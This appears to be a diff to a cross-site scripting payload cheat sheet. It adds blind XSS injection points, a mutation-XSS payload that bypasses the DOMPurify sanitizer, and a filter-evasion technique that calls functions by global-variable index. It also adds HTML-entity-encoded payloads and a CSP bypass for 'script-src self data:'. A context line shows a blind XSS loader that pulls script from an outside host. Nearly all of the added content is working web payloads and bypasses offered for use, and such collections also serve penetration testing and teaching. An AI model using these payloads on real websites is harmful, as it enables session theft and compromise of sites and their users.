@@ -18,6 +18,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [XSS Hunter](#xss-hunter)
   - [Other Blind XSS tools](#other-blind-xss-tools)
   - [Blind XSS endpoint](#blind-xss-endpoint)
+- [Mutated XSS](#mutated-xss)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
   - [Bypass case sensitive](#bypass-case-sensitive)
@@ -416,6 +417,21 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Referer Header
   - Custom Site Analytics
   - Administrative Panel logs
+- User Agent
+  - Custom Site Analytics
+  - Administrative Panel logs
+- Comment Box
+  - Administrative Panel
+
+## Mutated XSS
+
+Use browsers quirks to recreate some HTML tags when it is inside an `element.innerHTML`.
+
+Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.
+
+```javascript
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
 
 ## Polyglot XSS
 
@@ -663,6 +679,38 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
+From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables
+
+The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.
+
+```javascript
+c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
+// 5
+```
+
+Then calling alert is :
+
+```javascript
+Object.keys(self)[5]
+// "alert"
+self[Object.keys(self)[5]]("1") // alert("1")
+```
+
+We can find "alert" with a regular expression like ^a[rel]+t$ : 
+
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()
+
+// then you can use a() with Object.keys
+
+self[Object.keys(self)[a()]]("1") // alert("1")
+```
+
+Oneliner: 
+```javascript
+a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
+```
+
 From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.
 
 ```javascript
@@ -751,6 +799,8 @@ You don't need to close your tags.
 
 ```javascript
 %26%2397;lert(1)
+&#97;&#108;&#101;&#114;&#116;
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
 ```
 
 ### Bypass using Katana
@@ -914,6 +964,15 @@ Works for CSP like `script-src self`
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
+### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+
+Works for CSP like `script-src 'self' data:`
+
+```javascript
+<script ?/src="data:+,\u0061lert%281%29">/</script>
+```
+
+
 ## Common WAF Bypass
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar) - 3rd june 2019
@@ -1047,3 +1106,5 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be) 
 - [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
 - [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
+- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
